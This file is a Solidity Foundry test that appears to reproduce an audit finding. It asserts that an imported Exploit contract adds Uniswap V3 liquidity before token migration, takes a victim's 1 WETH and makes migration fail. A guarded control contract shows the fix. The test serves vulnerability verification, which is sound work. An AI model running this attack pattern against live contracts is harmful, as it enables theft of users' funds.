// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Exploit, WETH, G8Token, UniV3Pool, Victim} from
    "./45308-h-03-its-possible-to-add-liquidity-to-uniswapv3-while-token.sol";

contract Finding45308Test is Test {
    address constant SINK = 0x000000000000000000000000000000000000D00d;

    function test_exploit_pre_migration_liquidity_steals_weth_and_bricks_migrate() public {
        Exploit e = new Exploit();
        e.run();

        assertTrue(e.migrateFailed(), "migrate reverted");
        assertFalse(e.token().migrated(), "unmigrated");
        assertEq(e.weth().balanceOf(SINK), 1e18, "1 WETH taken from the victim");
        assertEq(e.weth().balanceOf(address(e.victim())), 0, "victim spent all weth");
        assertLt(e.victimTokens(), 1e15, "dust tokens out");
        assertEq(e.weth().balanceOf(address(e)), 100e18, "attacker capital returned");
    }

    function test_control_buy_to_pool_reverts_when_guarded_and_migrate_works() public {
        WETH weth = new WETH();
        G8TokenGuarded token = new G8TokenGuarded();
        // A guarded buy refuses the pool, so the callback cannot satisfy M0.
        // Migration of an empty pool succeeds.
        token.setPool(address(0xBEEF));
        vm.expectRevert(bytes("no pool buy"));
        token.buy(address(0xBEEF), 1);
        token.migrate(address(0xBEEF));
        assertTrue(token.migrated(), "migrated");
        weth;
    }
}

contract G8TokenGuarded {
    address public pool;
    bool public migrated;
    mapping(address => uint256) public balanceOf;

    function setPool(address p) external {
        pool = p;
    }

    function buy(address to, uint256 amount) external {
        require(to != pool, "no pool buy");
        balanceOf[to] += amount;
    }

    function migrate(address pool_) external {
        require(pool_ == pool, "pool");
        migrated = true;
    }
}
